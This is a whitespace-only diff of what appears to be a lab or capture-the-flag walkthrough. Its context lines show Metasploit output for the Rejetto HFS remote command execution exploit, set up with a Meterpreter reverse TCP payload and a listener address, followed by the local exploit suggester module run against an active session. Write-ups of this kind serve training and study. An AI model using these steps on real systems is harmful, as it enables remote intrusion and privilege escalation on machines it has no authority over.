@@ -59,9 +59,9 @@ Matching Modules
 ================
 
    #  Name                                   Disclosure Date  Rank       Check  Description
+
    -  ----                                   ---------------  ----       -----  -----------
    0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution
-
 
 Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec
 ```
@@ -91,7 +91,6 @@ Module options (exploit/windows/http/rejetto_hfs_exec):
    URIPATH                     no        The URI to use for this exploit (default is random)
    VHOST                       no        HTTP server virtual host
 
-
 Payload options (windows/meterpreter/reverse_tcp):
 
    Name      Current Setting  Required  Description
@@ -100,14 +99,11 @@ Payload options (windows/meterpreter/reverse_tcp):
    LHOST     172.31.150.94    yes       The listen address (an interface may be specified)
    LPORT     4444             yes       The listen port
 
-
 Exploit target:
 
    Id  Name
    --  ----
    0   Automatic
-
-
 
 View the full module info with the info, or info -d command.
 
@@ -232,9 +228,9 @@ Matching Modules
 ================
 
    #  Name                                      Disclosure Date  Rank    Check  Description
+
    -  ----                                      ---------------  ----    -----  -----------
    0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester
-
 
 Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester
 
@@ -249,7 +245,6 @@ Module options (post/multi/recon/local_exploit_suggester):
    ----             ---------------  --------  -----------
    SESSION                           yes       The session to run this module on
    SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits
-
 
 View the full module info with the info, or info -d command.
 # attach module to the active session
